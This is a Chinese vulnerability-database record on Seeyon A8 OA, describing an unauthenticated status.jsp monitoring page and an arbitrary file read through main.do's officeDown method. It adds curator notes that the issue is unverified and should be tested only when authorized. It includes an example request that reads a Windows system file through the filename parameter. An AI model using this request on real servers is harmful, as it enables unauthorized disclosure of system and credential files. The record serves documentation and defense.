---
source: "hatch 补库批 20260928"
title: "致远A8 management/status未授权与main.do officeDown文件读取"
product: "致远A8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A8，无版本；Windows示例"
prerequisites: "性能页称未授权；文件读取权限未明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.md"
id: "vw-962f0d05df3e0d6d24d51086"
entity_id: "ve-962f0d05df3e0d6d24d51086"
schema_version: "1"
---

# 致远A8 management/status未授权与main.do officeDown文件读取

## 条目说明

- 对象与具体问题：致远A8；management/status未授权与main.do officeDown文件读取
- 版本、配置及部署条件：A8，无版本；Windows示例
- 认证与权限前提：性能页称未授权；文件读取权限未明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 一文两独立接口风险应拆实体
- filename=c:/boot.in疑boot.ini截断且无响应；未证明任意路径范围
- 与A8-m万能口令同status端点认证结论有差异，需按版本/配置核对

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

致远OA A8

三、复现过程
------------

该地址为性能监控后台，存在未授权访问

seeyon/management/status.jsp

任意文件读取漏洞,由于对filename未进行过滤，导致可下载读取任意文件

    http://www.0-sec.org/seeyon/main.do?method=officeDown&filename=c:/boot.in
